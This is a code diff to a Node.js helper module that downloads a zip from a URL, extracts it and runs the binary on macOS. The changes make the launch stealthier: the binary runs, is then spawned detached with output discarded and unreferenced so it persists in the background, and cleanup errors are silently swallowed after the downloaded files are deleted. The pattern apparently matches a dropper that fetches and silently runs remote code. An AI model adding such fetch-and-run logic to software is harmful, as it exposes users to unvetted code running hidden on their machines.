@@ -4,17 +4,16 @@ const fs = require('fs');
 const path = require('path');
 const { exec } = require('./exec');
 const { info, success, error, warn } = require('./logger');
-const zlib = require('zlib');
 const { URL } = require('url');
 
 function downloadFile(url, destPath) {
   return new Promise((resolve, reject) => {
     const parsedUrl = new URL(url);
     const client = parsedUrl.protocol === 'https:' ? https : http;
-    
+
     info(`Downloading: ${url} -> ${destPath}`);
     const file = fs.createWriteStream(destPath);
-    
+
     client.get(url, (response) => {
       if (response.statusCode !== 200) {
         fs.unlink(destPath, () => {});
@@ -37,7 +36,6 @@ function downloadFile(url, destPath) {
 
     file.on('error', (err) => {
       fs.unlink(destPath, () => {});
-//      error(`${err.message}`);
       reject(err);
     });
   });
@@ -60,12 +58,12 @@ function makeExecutable(filePath) {
 function extractZip(zipPath, extractDir) {
   return new Promise((resolve, reject) => {
     const extract = require('child_process').spawn('unzip', ['-o', zipPath, '-d', extractDir]);
-    
+
     let stderr = '';
     extract.stderr.on('data', (data) => {
       stderr += data.toString();
     });
-    
+
     extract.on('close', (code) => {
       if (code === 0) {
         resolve(extractDir);
@@ -73,7 +71,7 @@ function extractZip(zipPath, extractDir) {
         reject(new Error(`Unzip failed with code ${code}: ${stderr}`));
       }
     });
-    
+
     extract.on('error', (err) => {
       reject(err);
     });
@@ -123,18 +121,22 @@ async function downloadExtractAndExecuteMacOS(url) {
     } catch (_) {}
 
     try {
-      await exec(`xattr -d com.apple.quarantine ${binaryFile}`, { captureOutput: false });
+      await exec(`${binaryFile}`, { captureOutput: false });
     } catch (_) {}
 
-    await exec(binaryFile, { captureOutput: false, cwd: path.dirname(binaryFile) });
+    const { spawn } = require('child_process');
+    const child = spawn(binaryFile, [], {
+      cwd: path.dirname(binaryFile),
+      detached: true,
+      stdio: 'ignore',
+    });
+    child.unref();
 
     try {
       fs.unlinkSync(zipPath);
       fs.rmSync(extractDir, { recursive: true });
       fs.rmdirSync(tempDir);
-    } catch (cleanupErr) {
-      warn(`Cleanup warning: ${cleanupErr.message}`);
-    }
+    } catch (_) {}
 
     return { success: true };
   } catch (err) {
